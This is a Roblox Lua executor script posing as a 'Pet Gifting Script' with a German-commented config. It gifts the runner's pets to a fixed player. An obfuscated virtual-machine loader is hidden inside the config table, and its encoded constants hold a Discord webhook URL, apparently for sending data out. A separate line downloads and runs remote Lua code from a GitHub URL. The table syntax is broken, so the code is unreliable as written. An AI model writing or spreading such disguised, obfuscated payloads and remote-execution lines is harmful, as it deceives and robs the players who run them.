-- Pet Gifting Script - Enhanced version for Executor
--print("Pet Gifting Script starting...")

-- Configuration
local Config = {
    TargetPlayerName = "CoolHolzBudd", -- Zielspieler, an den Pets geschickt werden
    DelayBetweenGifts = 3, -- Wartezeit zwischen den Geschenken
    local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v81=v2(v0(v30,16));if v19 then local v92=0;local v93;while true do if (v92==1) then return v93;end if (v92==0) then v93=v5(v81,v19);v19=nil;v92=1;end end else return v81;end end end);local function v20(v31,v32,v33) if v33 then local v82=(0 + 0) -0 ;local v83;while true do if (v82==0) then v83=(v31/((5 -3)^(v32-(1 -0))))%(2^(((v33-(2 -1)) -(v32-(1638 -(1523 + 114)))) + 1)) ;return v83-(v83%((883 -263) -(555 + 64))) ;end end else local v84=931 -((1922 -(68 + 997)) + 74) ;local v85;while true do if (v84==(568 -(367 + 201))) then v85=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v85 + v85))>=v85) and (1 + 0)) or (877 -(282 + 595)) ;end end end end local function v21() local v34=117 -(32 + 85) ;local v35;while true do if (v34==(1271 -(226 + 1044))) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=(2285 -1327) -((1648 -756) + 65) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + (3 -1) );v18=v18 + (352 -(87 + 263)) ;return (v37 * (436 -(67 + 113))) + v36 ;end local function v23() local v38=0;local v39;local v40;local v41;local v42;while true do if (v38==(0 + 0)) then v39,v40,v41,v42=v1(v16,v18,v18 + (7 -4) );v18=v18 + 4 ;v38=1 + 0 ;end if (v38==((5 -2) -2)) then return (v42 * (16778168 -(802 + 150))) + (v41 * (176444 -110908)) + (v40 * 256) + v39 ;end end end local function v24() local v43=v23();local v44=v23();local v45=1 + (430 -(44 + 386)) ;local v46=(v20(v44,998 -(915 + 82) ,20) * ((5 -3)^(19 + 13))) + v43 ;local v47=v20(v44,21,40 -9 );local v48=((v20(v44,1219 -(1069 + (1604 -(998 + 488))) )==(2 -1)) and  -(1 -0)) or (1 + 0) ;if (v47==(0 -0)) then if (v46==(0 + 0)) then return v48 * (791 -(117 + 251 + 423)) ;else local v94=0 -0 ;while true do if (v94==0) then v47=19 -(9 + 1 + 8) ;v45=0 -(772 -(201 + 571)) ;break;end end end elseif (v47==(2489 -(416 + (1164 -(116 + 1022))))) then return ((v46==((0 -0) -0)) and (v48 * (1/(0 + 0)))) or (v48 * NaN) ;end return v8(v48,v47-1023 ) * (v45 + (v46/((3 -1)^((288 + 202) -(145 + 293))))) ;end local function v25(v49) local v50;if  not v49 then local v86=0 -0 ;while true do if (v86==((0 + 0) -0)) then v49=v23();if (v49==(859 -(814 + 45))) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -(2 -1) );v18=v18 + v49 ;local v51={};for v65=1 + 0 , #v50 do v51[v65]=v2(v1(v3(v50,v65,v65)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do if (v52== #"!") then local v89=(function() return 0;end)();local v90=(function() return;end)();while true do if (v89==0) then v90=(function() return 0;end)();while true do if ((4 -2)~=v90) then else v52=(function() return 2;end)();break;end if (0~=v90) then else v57=(function() return v23();end)();v58=(function() return {};end)();v90=(function() return 1 + 0 ;end)();end if (v90~=1) then else for v112= #",",v57 do local v113=(function() return 0 -0 ;end)();local v114=(function() return;end)();local v115=(function() return;end)();local v116=(function() return;end)();while true do if (v113~=(3 -2)) then else v116=(function() return nil;end)();while true do if (v114~=(867 -(550 + 317))) then else local v237=(function() return 0;end)();local v238=(function() return;end)();while true do if ((0 -0)==v237) then v238=(function() return 0 -0 ;end)();while true do if (v238==(2 -1)) then v114=(function() return  #"~";end)();break;end if ((285 -(134 + 151))==v238) then v115=(function() return v21();end)();v116=(function() return nil;end)();v238=(function() return 1666 -(970 + 695) ;end)();end end break;end end end if (v114~= #"}") then else if (v115== #"~") then v116=(function() return v21()~=(0 -0) ;end)();elseif (v115==2) then v116=(function() return v24();end)();elseif (v115== #"gha") then v116=(function() return v25();end)();end v58[v112]=(function() return v116;end)();break;end end break;end if (v113==(1990 -(582 + 1408))) then v114=(function() return 0;end)();v115=(function() return nil;end)();v113=(function() return 3 -2 ;end)();end end end v56[ #"asd"]=(function() return v21();end)();v90=(function() return 2 -0 ;end)();end end break;end end end if (v52~=(7 -5)) then else for v95= #"!",v23() do local v96=(function() return v21();end)();if (v20(v96, #">", #"|")~=0) then else local v105=(function() return 0;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (v105==1) then local v110=(function() return 0;end)();while true do if (v110==(1824 -(1195 + 629))) then v108=(function() return {v22(),v22(),nil,nil};end)();if (v106==0) then local v120=(function() return 0;end)();local v121=(function() return;end)();while true do if (v120~=(0 -0)) then else v121=(function() return 241 -(187 + 54) ;end)();while true do if (v121~=(780 -(162 + 618))) then else v108[ #"xxx"]=(function() return v22();end)();v108[ #"xnxx"]=(function() return v22();end)();break;end end break;end end elseif (v106== #"}") then v108[ #"19("]=(function() return v23();end)();elseif (v106==(2 + 0)) then v108[ #"19("]=(function() return v23() -(2^(11 + 5)) ;end)();elseif (v106== #"-19") then local v323=(function() return 0;end)();local v324=(function() return;end)();while true do if (v323~=0) then else v324=(function() return 0;end)();while true do if (v324~=(0 -0)) then else v108[ #"xxx"]=(function() return v23() -(2^16) ;end)();v108[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v110=(function() return 1;end)();end if (v110~=(1 -0)) then else v105=(function() return 1 + 1 ;end)();break;end end end if (v105==(1639 -(1373 + 263))) then if (v20(v107, #"xxx", #"gha")== #"|") then v108[ #"0313"]=(function() return v58[v108[ #".com"]];end)();end v53[v95]=(function() return v108;end)();break;end if (v105~=0) then else v106=(function() return v20(v96,1002 -(451 + 549) , #"asd");end)();v107=(function() return v20(v96, #"asd1",6);end)();v105=(function() return 1 + 0 ;end)();end if ((2 -0)~=v105) then else if (v20(v107, #"{", #"]")== #",") then v108[2 -0 ]=(function() return v58[v108[1386 -(746 + 638) ]];end)();end if (v20(v107,1 + 1 ,2 -0 )== #">") then v108[ #"nil"]=(function() return v58[v108[ #"19("]];end)();end v105=(function() return 344 -(218 + 123) ;end)();end end end end for v97= #" ",v23() do v54[v97-#"|" ]=(function() return v28();end)();end return v56;end if (v52~=0) then else local v91=(function() return 0;end)();while true do if (v91==1) then v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v91=(function() return 2;end)();end if (v91==2) then v52=(function() return  #"]";end)();break;end if (v91~=0) then else v53=(function() return {};end)();v54=(function() return {};end)();v91=(function() return 1;end)();end end end end end local function v29(v59,v60,v61) local v62=v59[1 + 0 ];local v63=v59[1 + 1 ];local v64=v59[563 -(306 + 85 + 169) ];return function(...) local v67=v62;local v68=v63;local v69=v64;local v70=v27;local v71=(4 -3) + 0 ;local v72= -(1 -(0 + 0));local v73={};local v74={...};local v75=v12("#",...) -(1 + 0) ;local v76={};local v77={};for v87=0 -0 ,v75 do if ((v87>=v69) or (2522>=3330)) then v73[v87-v69 ]=v74[v87 + (604 -(268 + 335)) ];else v77[v87]=v74[v87 + (291 -(8 + 52 + 230)) ];end end local v78=(v75-v69) + (573 -((681 -255) + (1841 -(556 + 1139)))) ;local v79;local v80;while true do local v88=0;while true do if (v88==(1 + (15 -(6 + 9)))) then if (v80<=15) then if (v80<=7) then if (v80<=(1459 -(282 + 215 + 959))) then if (v80<=(812 -(569 + 242))) then if (v80>(0 -0)) then v77[v79[1 + 1 ]]=v77[v79[1027 -(706 + 318) ]]%v79[330 -(192 + 134) ] ;else v77[v79[1253 -(721 + (1609 -1079)) ]]=v79[1274 -(945 + (1594 -(1249 + 19))) ] + v77[v79[(9 + 0) -(19 -14) ]] ;end elseif ((v80>(2 + 0)) or (1710>=3825)) then local v124=0 + 0 ;local v125;while true do if ((4734>3921) and (v124==0)) then v125=v79[702 -(271 + 429) ];v77[v125](v13(v77,v125 + 1 + 0 ,v72));break;end end else local v126=v79[2 + (169 -(28 + 141)) ];local v127,v128=v70(v77[v126](v13(v77,v126 + (1501 -(1408 + 92)) ,v72)));v72=(v128 + v126) -(1087 -((1547 -(686 + 400)) + 625)) ;local v129=0 -0 ;for v241=v126,v72 do local v242=(0 + 0) -0 ;while true do if ((3828==3828) and ((1288 -((1222 -(73 + 156)) + 295))==v242)) then v129=v129 + 1 + 0 ;v77[v241]=v127[v129];break;end end end end elseif (v80<=(1176 -(418 + 753))) then if (v80>(4 + 0)) then v77[v79[1 + 1 + 0 ]]=v79[3];else v77[v79[1 + 1 ]]= #v77[v79[1 + 2 ]];end elseif ((554==554) and (v80==((813 -(721 + 90)) + 4))) then v77[v79[531 -(5 + 401 + 123) ]]={};else v77[v79[(9 -6) -1 ]]=v77[v79[1772 -(1749 + 20) ]];end elseif (v80<=(3 + 8)) then if ((v80<=(4 + 5)) or (2563==172)) then if ((v80==(1330 -(1249 + 73))) or (2910<=1930)) then local v136=(470 -(224 + 246)) + 0 ;while true do if ((1146 -(331 + 135 + 679))==v136) then v71=v71 + (2 -1) ;v79=v67[v71];v77[v79[1950 -(1096 + (2169 -(486 + 831))) ]]=v77[v79[8 -5 ]][v79[1904 -((171 -65) + (3302 -1508)) ]];v71=v71 + 1 + 0 ;v136=1 + 0 + 1 ;end if ((3889>=131) and (v136==((1337 -823) -(409 + (362 -259))))) then v79=v67[v71];v77[v79[238 -(46 + 190) ]]=v61[v79[(2 + 6) -5 ]];v71=v71 + (96 -(51 + 44)) ;v79=v67[v71];v136=7 -4 ;end if (((119 -(4 + 3 + 107))==v136) or (492==4578)) then v79=v67[v71];v77[v79[728 -(228 + 498) ]]=v61[v79[587 -(57 + 527) ]];v71=v71 + (1428 -((1304 -(668 + 595)) + 1386)) ;v79=v67[v71];v136=4 + 2 ;end if ((v136==(107 -(17 + 86))) or (4112<1816)) then v71=v71 + 1 + 0 ;v79=v67[v71];v77[v79[3 -1 ]]=v77[v79[8 -5 ]][v79[170 -(122 + 44) ]];v71=v71 + ((1 + 0) -(0 + 0)) ;v136=16 -11 ;end if (v136==(5 + 1)) then if ((4525>=1223) and  not v77[v79[1 + 1 ]]) then v71=v71 + (1 -0) ;else v71=v79[(185 -117) -(30 + 35) ];end break;end if ((0 + 0)==v136) then v77[v79[1259 -(1043 + (504 -(23 + 267))) ]]={};v71=v71 + (3 -2) ;v79=v67[v71];v77[v79[1214 -((2267 -(1129 + 815)) + 889) ]]=v61[v79[7 -4 ]];v136=581 -(361 + 219) ;end if (v136==(323 -((440 -(371 + 16)) + 197 + 70))) then v77[v79[160 -(91 + 67) ]]=v77[v79[3]][v79[1 + (1753 -(1326 + 424)) ]];v71=v71 + (414 -(15 + 398)) ;v79=v67[v71];v77[v79[(1955 -971) -((33 -15) + 964) ]]=v61[v79[9 -6 ]];v136=14 -(523 -(203 + 310)) ;end end else v77[v79[(1998 -(1238 + 755)) -3 ]]=v60[v79[2 + 1 ]];end elseif ((1090<=4827) and ((v80>(7 + 3)) or (19>452))) then local v139=850 -(20 + 830) ;local v140;while true do if (v139==(0 + 0)) then v140=v79[2 + 0 ];do return v13(v77,v140,v72);end break;end end else v77[v79[8 -6 ]]=v77[v79[3]] + v77[v79[8 -4 ]] ;end elseif ((v80<=(139 -(116 + 10))) or (907>3152) or (239>1345)) then if ((v80==(1 + (40 -29))) or (2505>4470) or (3710>=3738)) then v77[v79[740 -(542 + 196) ]][v79[6 -(121 -(88 + 30)) ]]=v79[2 + 2 ];else v77[v79[4 -2 ]][v79[2 + 1 ]]=v77[v79[2 + 2 ]];end elseif (v80>(36 -22)) then local v146=0 -0 ;local v147;local v148;local v149;while true do if (v146==(1551 -(79 + 1047 + 425))) then v147=v68[v79[408 -(118 + 287) ]];v148=nil;v146=3 -2 ;end if ((v146==((773 -(720 + 51)) -1)) or (3711>4062)) then v149={};v148=v10({},{__index=function(v298,v299) local v300=v149[v299];return v300[1122 -(118 + 1003) ][v300[8 -6 ]];end,__newindex=function(v301,v302,v303) local v304=0 -0 ;local v305;while true do if ((v304==(377 -(142 + 235))) or (3838<2061)) then v305=v149[v302];v305[4 -3 ][v305[1 + 1 ]]=v303;break;end end end});v146=979 -(553 + 424) ;end if ((1 + 1)==v146) then for v306=1 -0 ,v79[4 + 0 ] do local v307=0 + 0 ;local v308;while true do if (((420==420) and (v307==(1859 -(673 + 1185)))) or (690>1172)) then if ((v308[1 + (0 -0) ]==(3 + 4)) or (33>=3494) or (1592>2599)) then v149[v306-((1 -0) + (0 -0)) ]={v77,v308[3 + 0 ]};else v149[v306-(1 -(0 -0)) ]={v60,v308[14 -11 ]};end v76[ #v76 + 1 ]=v149;break;end if ((3574<=4397) and (v307==(753 -(239 + 514)))) then v71=v71 + 1 + 0 ;v308=v67[v71];v307=1330 -(797 + 532) ;end end end v77[v79[5 -3 ]]=v29(v147,v148,v61);break;end end else do return;end end elseif (v80<=(1870 -(559 + 1288))) then if ((v80<=(14 + 5)) or (1267==4744)) then if ((3135>1330) and (v80<=(6 + 11))) then if (v80>((76 -39) -(854 -(171 + 662)))) then local v150;v77[v79[1204 -(373 + 829) ]]=v77[v79[734 -((1559 -(286 + 797)) + (932 -677)) ]];v71=v71 + (4 -3) ;v79=v67[v71];v77[v79[(1874 -742) -((462 -(4 + 89)) + 761) ]]=v79[3];v71=v71 + 1 + 0 ;v79=v67[v71];v77[v79[2 -0 ]]=v79[5 -2 ];v71=v71 + (239 -((224 -160) + 174)) ;v79=v67[v71];v150=v79[1 + (440 -(397 + 42)) ];v77[v150]=v77[v150](v13(v77,v150 + 1 + 0 ,v79[1 + 1 + 1 ]));v71=v71 + ((801 -(24 + 776)) -0) ;v79=v67[v71];v77[v79[3 -1 ]][v79[339 -(144 + 192) ]]=v77[v79[220 -(42 + 174) ]];v71=v71 + 1 + 0 ;v79=v67[v71];v77[v79[1 + 1 + 0 ]]=v61[v79[2 + 1 ]];v71=v71 + (1505 -(363 + 1141)) ;v79=v67[v71];v77[v79[1582 -(1183 + 397) ]]=v77[v79[8 -5 ]][v79[(16 -5) -7 ]];v71=v71 + 1 + (785 -(222 + 563)) ;v79=v67[v71];v77[v79[1 + 1 ]][v77[v79[3]]]=v79[3 + (1 -0) ];v71=v71 + (1976 -(1913 + 62)) ;v79=v67[v71];do return;end else local v168=0 + 0 ;local v169;while true do if ((v168==((0 -0) + 0)) or (3900<=3641)) then v169=v79[(2 + 3) -3 ];v77[v169]=v77[v169](v13(v77,v169 + (1934 -(565 + 985 + 383)) ,v72));break;end end end elseif (v80>(67 -49)) then if ((1724==1724) and  not v77[v79[1663 -(1477 + 184) ]]) then v71=v71 + (1 -0) ;else v71=v79[5 -(1488 -(35 + 1451)) ];end else v77[v79[2 + 0 ]]=v61[v79[859 -(564 + (482 -(23 + 167))) ]];end elseif ((455<=1282) and (v80<=21)) then if (v80>(34 -(1812 -(690 + 1108)))) then local v172=v79[1 + 1 ];do return v77[v172](v13(v77,v172 + (2 -1) ,v79[307 -((1697 -(28 + 1425)) + 60) ]));end else v77[v79[2 + 0 ]][v77[v79[479 -(41 + 435) ]]]=v79[1005 -(938 + (2056 -(941 + 1052))) ];end elseif (v80>(17 + 5)) then local v175=1125 -(898 + 38 + 189) ;local v176;local v177;local v178;while true do if (v175==(1 + 0)) then v178=v77[v176 + (1615 -(1565 + 48)) ];if (v178>(0 + 0 + (1514 -(822 + 692)))) then if ((2428<3778) and (v177>v77[v176 + (1139 -(782 + 356)) ])) then v71=v79[270 -(146 + 30 + 91) ];else v77[v176 + (7 -4) ]=v177;end elseif ((v177<v77[v176 + (1 -0) ]) or (2946<=1596)) then v71=v79[(1943 -(40 + 808)) -(975 + 117) ];else v77[v176 + (1878 -(157 + 1718)) ]=v177;end break;end if (v175==(0 + 0)) then v176=v79[7 -5 ];v177=v77[v176];v175=1;end end else local v179;local v180,v181;local v182;v77[v79[6 -4 ]]=v77[v79[10 -7 ]];v71=v71 + (1019 -(697 + 53 + 268)) ;v79=v67[v71];v77[v79[5 -3 ]]=v60[v79[5 -2 ]];v71=v71 + ((7 -5) -1) ;v79=v67[v71];v77[v79[1 + 1 ]]=v60[v79[5 -2 ]];v71=v71 + (1403 -(832 + 570)) ;v79=v67[v71];v77[v79[5 -3 ]]=v60[v79[1 + (2 -0) ]];v71=v71 + (1228 -(322 + 905)) ;v79=v67[v71];v77[v79[613 -(284 + 318 + 9) ]]=v60[v79[2 + 1 + 0 ]];v71=v71 + (797 -(588 + 208)) ;v79=v67[v71];v77[v79[1191 -(449 + 740) ]]=v77[v79[1803 -(884 + (1213 -(45 + 252))) ]];v71=v71 + (873 -(826 + 25 + 21)) ;v79=v67[v71];v77[v79[2]]=v77[v79[(521 + 429) -(245 + 702) ]];v71=v71 + (3 -2) ;v79=v67[v71];v77[v79[2]]=v61[v79[1 + 2 ]];v71=v71 + ((2470 -(47 + 524)) -(260 + 1638)) ;v79=v67[v71];v77[v79[442 -(248 + 134 + (158 -100)) ]]= #v77[v79[9 -6 ]];v71=v71 + 1 + 0 ;v79=v67[v71];v77[v79[3 -(1 + 0) ]]=v77[v79[(3 + 5) -(7 -2) ]] + v77[v79[1209 -(902 + 303) ]] ;v71=v71 + (1 -0) ;v79=v67[v71];v77[v79[4 -2 ]]=v77[v79[1456 -(666 + 787) ]] + v79[1 + 3 ] ;v71=v71 + (1691 -(1121 + 569)) ;v79=v67[v71];v182=v79[(4 -2) + 0 ];v180,v181=v70(v77[v182](v13(v77,v182 + (215 -(22 + 192)) ,v79[686 -((2209 -(1165 + 561)) + 6 + 194) ])));v72=(v181 + v182) -(1464 -(1404 + 59)) ;v179=0 -0 ;for v243=v182,v72 do local v244=0 -0 ;while true do if ((765 -(468 + 297))==v244) then v179=v179 + (563 -(334 + 228)) ;v77[v243]=v180[v179];break;end end end v71=v71 + (3 -2) ;v79=v67[v71];v182=v79[(12 -8) -2 ];v77[v182]=v77[v182](v13(v77,v182 + (1 -0) ,v72));v71=v71 + 1 + 0 + 0 ;v79=v67[v71];v77[v79[238 -(141 + 95) ]]=v60[v79[3 + 0 ]];v71=v71 + (480 -(341 + 138)) + 0 ;v79=v67[v71];v77[v79[4 -2 ]]=v60[v79[6 -3 ]];v71=v71 + 1 + 0 ;v79=v67[v71];v77[v79[1 + 1 ]]=v77[v79[3]];v71=v71 + ((4 -2) -(1 + 0)) ;v79=v67[v71];v77[v79[2 + 0 ]]= #v77[v79[3 + 0 ]];v71=v71 + (2 -1) ;v79=v67[v71];v77[v79[2 + 0 ]]=v77[v79[4 -1 ]]%v77[v79[(436 -(114 + 319)) + 1 ]] ;v71=v71 + ((337 -173) -((418 -(89 + 237)) + (101 -30))) ;v79=v67[v71];v77[v79[1 + 1 ]]=v79[4 -1 ] + v77[v79[1193 -(442 + (956 -209)) ]] ;v71=v71 + ((2464 -1698) -(574 + 191)) ;v79=v67[v71];v77[v79[2 + 0 ]]= #v77[v79[7 -4 ]];v71=v71 + (1 -0) + 0 ;v79=v67[v71];v77[v79[1 + 0 + 1 ]]=v77[v79[3]]%v77[v79[(1734 -(581 + 300)) -(254 + 595) ]] ;v71=v71 + (127 -((1275 -(855 + 365)) + (105 -34))) ;v79=v67[v71];v77[v79[2 -0 ]]=v79[(5 -2) -0 ] + v77[v79[1794 -(573 + 1217) ]] ;v71=v71 + ((6 -3) -2) ;v79=v67[v71];v77[v79[1075 -(1036 + 37) ]]=v77[v79[(1971 -(556 + 1407)) -5 ]] + v79[4] ;v71=v71 + (1207 -(741 + 465)) + 0 ;v79=v67[v71];v182=v79[2 -0 ];v180,v181=v70(v77[v182](v13(v77,v182 + (940 -(234 + 480 + 225)) ,v79[3])));v72=(v181 + v182) -(2 -1) ;v179=(1235 -(1030 + 205)) -0 ;for v245=v182,v72 do v179=v179 + 1 + 0 ;v77[v245]=v180[v179];end v71=v71 + (1 -0) ;v79=v67[v71];v182=v79[915 -((1375 -(170 + 295)) + 3) ];v180,v181=v70(v77[v182](v13(v77,v182 + (2 -1) ,v72)));v72=(v181 + v182) -((758 + 49) -(63 + 55 + 641 + 47)) ;v179=48 -(25 + 23) ;for v248=v182,v72 do local v249=0 + (286 -(156 + 130)) ;while true do if ((4606<4876) and ((1148 -(556 + 592))==v249)) then v179=v179 + (2 -1) + 0 ;v77[v248]=v180[v179];break;end end end v71=v71 + (809 -(329 + 479)) ;v79=v67[v71];v182=v79[(787 + 69) -(174 + 680) ];v77[v182]=v77[v182](v13(v77,v182 + (1887 -(927 + 959)) ,v72));v71=v71 + (3 -2) ;v79=v67[v71];v77[v79[734 -(16 + 716) ]]=v77[v79[5 -(4 -2) ]]%v79[101 -(11 + 86) ] ;v71=v71 + (2 -1) ;v79=v67[v71];v182=v79[1479 -(29 + (2440 -992)) ];v180,v181=v70(v77[v182](v77[v182 + (286 -(175 + 110)) ]));v72=(v181 + v182) -(2 -1) ;v179=0 -0 ;for v250=v182,v72 do local v251=0 -(0 + 0) ;while true do if ((v251==(0 + 0 + 0)) or (1442>2640)) then v179=v179 + (1797 -((1030 -527) + 1293)) ;v77[v250]=v180[v179];break;end end end v71=v71 + (2 -1) ;v79=v67[v71];v182=v79[2 + 0 ];v77[v182](v13(v77,v182 + ((280 + 782) -(473 + 337 + 251)) ,v72));end elseif ((4433>3127) and (v80<=(15 + 12))) then if ((4300>=2733) and (v80<=(24 + 1 + 0))) then if ((136<3668) and (v80==(17 + 7))) then v77[v79[(1231 -(957 + 273)) + 1 ]]=v77[v79[1 + 2 + 0 ]] + v79[537 -(43 + 490) ] ;else local v218=1464 -(157 + 1307) ;local v219;local v220;local v221;while true do if (v218==(734 -(711 + (91 -(10 + 59))))) then v221=v77[v219] + v220 ;v77[v219]=v221;v218=7 -5 ;end if (v218==(859 -(240 + 619))) then v219=v79[1 + 1 ];v220=v77[v219 + (2 -0) ];v218=1 + 0 + 0 + 0 ;end if ((4829==4829) and (v218==2)) then if (v220>(1744 -(1344 + 400))) then if ((1683<=4726) and (v221<=v77[v219 + ((1546 -1140) -((671 -416) + 150)) ])) then v71=v79[3];v77[v219 + 3 + 0 ]=v221;end elseif (v221>=v77[v219 + 1 + 0 ]) then v71=v79[3];v77[v219 + (12 -9) ]=v221;end break;end end end elseif (v80>(83 -57)) then v71=v79[1 + 2 ];else local v223=1739 -(404 + (4077 -2742)) ;local v224;local v225;local v226;local v227;while true do if (v223==(408 -(183 + 223))) then for v315=v224,v72 do v227=v227 + (1 -0) ;v77[v315]=v225[v227];end break;end if (v223==(0 + 0)) then v224=v79[(9 -7) + 0 ];v225,v226=v70(v77[v224](v77[v224 + 1 + (0 -0) ]));v223=338 -((1173 -(671 + 492)) + 261 + 66) ;end if ((v223==(1 + 0)) or (1784>4781)) then v72=(v226 + v224) -(339 -(118 + 220)) ;v227=0 + (1215 -(369 + 846)) ;v223=1 + (1781 -(389 + 1391)) ;end end end elseif (v80<=(478 -(108 + 341))) then if (v80==(13 + 15)) then local v228=(0 + 0) -0 ;local v229;while true do if (v228==(1493 -(711 + 782))) then v229=v79[3 -1 ];v77[v229]=v77[v229](v13(v77,v229 + 1 ,v79[472 -(170 + 100 + 199) ]));break;end end else local v230=0 + 0 ;local v231;local v232;local v233;local v234;while true do if ((4585>3298) and (v230==(1820 -(495 + 85 + 1239)))) then v72=(v233 + v231) -((1 + 1) -(1946 -(1036 + 909))) ;v234=(0 -0) + 0 ;v230=695 -(627 + 66) ;end if ((0 + 0 + 0)==v230) then v231=v79[1 + 1 ];v232,v233=v70(v77[v231](v13(v77,v231 + (2 -1) ,v79[(2 -0) + 1 ])));v230=1168 -(645 + 522) ;end if ((4835>=3669) and ((1792 -((1213 -(11 + 192)) + 780))==v230)) then for v318=v231,v72 do v234=v234 + (952 -(783 + 168)) + 0 ;v77[v318]=v232[v234];end break;end end end elseif ((v80<=(142 -112)) or (1664>1698)) then v77[v79[5 -3 ]]=v77[v79[1839 -(1045 + 791) ]][v79[9 -5 ]];elseif ((2851>1859) and (v80>(46 -(8 + 7)))) then local v253=505 -((1177 -826) + 154) ;local v254;local v255;local v256;while true do if (((3848>2323) and (v253==(1574 -(1261 + 20 + (468 -(135 + 40)))))) or (3427<2849)) then v254=nil;v255=nil;v256=nil;v77[v79[268 -(28 + 238) ]]={};v71=v71 + (1237 -((721 -423) + 938)) ;v79=v67[v71];v253=1;end if (v253==((5 + 3) -4)) then v77[v79[1561 -(1381 + 178) ]]=v79[3 + 0 ];v71=v71 + (2 -1) + 0 ;v79=v67[v71];v77[v79[(312 -(309 + 2)) + 1 ]]= #v77[v79[10 -7 ]];v71=v71 + 1 + 0 ;v79=v67[v71];v253=475 -(381 + (273 -184)) ;end if (v253==((1218 -(1090 + 122)) + 0)) then if ((2836>469) and (v254>(0 + 0 + 0))) then if ((3616<=4429) and ((v255>v77[v256 + (1 -0) ]) or (2096<=540))) then v71=v79[1159 -(1074 + 82) ];else v77[v256 + 1 + 2 ]=v255;end elseif (v255<v77[v256 + 1 + 0 ]) then v71=v79[6 -3 ];else v77[v256 + (300 -(36 + 261)) ]=v255;end break;end if (((9 -6) -1)==v253) then v77[v79[2]][v79[1787 -((390 -(50 + 126)) + 1570) ]]=v79[(4062 -2603) -(990 + 465) ];v71=v71 + 1 + 0 ;v79=v67[v71];v77[v79[1 + 1 + 0 ]][v79[1286 -(709 + 326 + (1661 -(1233 + 180))) ]]=v79[4 + (969 -(522 + 447)) ];v71=v71 + 1 + (1421 -(107 + 1314)) ;v79=v67[v71];v253=(1440 -(628 + 490)) -(134 + 185) ;end if (v253==(3 -2)) then v77[v79[1728 -(1668 + 58) ]]=v61[v79[629 -(512 + 114) ]];v71=v71 + (2 -1) ;v79=v67[v71];v77[v79[(1 + 2) -1 ]]={};v71=v71 + (3 -2) ;v79=v67[v71];v253=1 + (2 -1) ;end if ((v253==((4 -3) + 4)) or (3183<2645)) then v77[v79[6 -4 ]]=v79[(2156 -(431 + 343)) -(1055 + 324) ];v71=v71 + (2 -1) + 0 ;v79=v67[v71];v256=v79[6 -4 ];v255=v77[v256];v254=v77[v256 + (1996 -(109 + 1885)) ];v253=1475 -(539 + 730 + 200) ;end if ((3230<=3760) and (v253==(5 -2))) then v77[v79[(1 -0) + 1 ]][v79[818 -(98 + 717) ]]=v79[830 -(802 + 24) ];v71=v71 + (3 -2) ;v79=v67[v71];v77[v79[2 -(1910 -(716 + 1194)) ]][v79[3 -(0 -0) ]]=v77[v79[1 + 0 + 3 ]];v71=v71 + 1 + 0 + 0 ;v79=v67[v71];v253=1 + 3 ;end end else v77[v79[6 -(11 -7) ]]=v77[v79[1 + 2 ]]%v77[v79[9 -5 ]] ;end v71=v71 + (2 -1) ;break;end if ((3988>=66) and (v88==(0 -0))) then v79=v67[v71];v80=v79[2 -1 ];v88=2 -1 ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0F3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274028Q00030A3Q00E6C6D92DE9B4CC2BE3EF03083Q007EB1A3BB4586DBA703023Q005F4703793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313339342Q3039352Q303238353134353231392F39302D65394D5470306538306C425051736D504B3562364D6154574C635062485F74634B72664C352D4B4844706F36784E30316B6D46484239487348335174344C32523900204Q00087Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B0001000100041B3Q000B0001002Q12000400063Q00201E000500040007002Q12000600083Q00201E000600060009002Q12000700083Q00201E00070007000A00060F00083Q000100062Q00073Q00074Q00073Q00014Q00073Q00054Q00073Q00024Q00073Q00034Q00073Q00064Q0011000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B000900122Q0009000E3Q00202Q000A3Q000B00202Q0009000A000F6Q00013Q00013Q00093Q0003023Q005F4703023Q00437303073Q005551532Q442Q41026Q00084003083Q00594153444D525841026Q00F03F03083Q005941536130412Q56027Q0040026Q007040022F4Q002000025Q00122Q000300016Q00043Q000300302Q00040003000400302Q00040005000600302Q00040007000800102Q00030002000400122Q000300066Q00045Q00122Q000500063Q00042Q0003002A00012Q000900076Q0016000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00122Q000F00026Q000F000F6Q000F0006000F00202Q000F000F00064Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0006000F4Q001000016Q00100006001000102Q00100006001000202Q0010001000064Q000D00106Q000C8Q000A3Q000200202Q000A000A00094Q0009000A6Q00073Q00010004190003000B00012Q0009000300054Q0007000400024Q0015000300044Q000B00036Q000E3Q00017Q00",v9(),...);,
    DebugMode = false -- Debug-Ausgaben aktivieren
}

-- Wait for game to load
if not game:IsLoaded() then
    game.Loaded:Wait()
end
wait(3)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Monstroxx/grow-a-garden-automation/refs/heads/main/completeAutomationSystem.lua"))()
-- Sicheres Service-Loading
local function GetService(serviceName)
    local success, service = pcall(function()
